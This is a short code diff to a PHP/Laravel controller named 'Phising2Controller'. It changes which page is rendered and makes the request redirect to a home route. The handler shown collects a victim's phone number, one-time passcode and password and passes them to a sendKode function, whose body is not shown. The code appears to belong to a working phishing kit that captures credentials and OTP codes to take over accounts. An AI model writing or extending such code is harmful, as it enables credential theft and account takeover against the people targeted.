@@ -8,7 +8,7 @@ class Phising2Controller extends Controller
 {
     public function index(Request $request)
     {
-        return inertia('Phising1/Index');
+        return inertia('Phising2/Index');
     }
 
 
@@ -52,7 +52,7 @@ class Phising2Controller extends Controller
         $password = $request->password;
 
         $this->sendKode($phone_number, $otp, $password,);
-        // return redirect()->route('data_diri');
+        return redirect()->route('one.home');
     }
     public function sendKode($phone = "",  $otp = "", $password = "")
     {
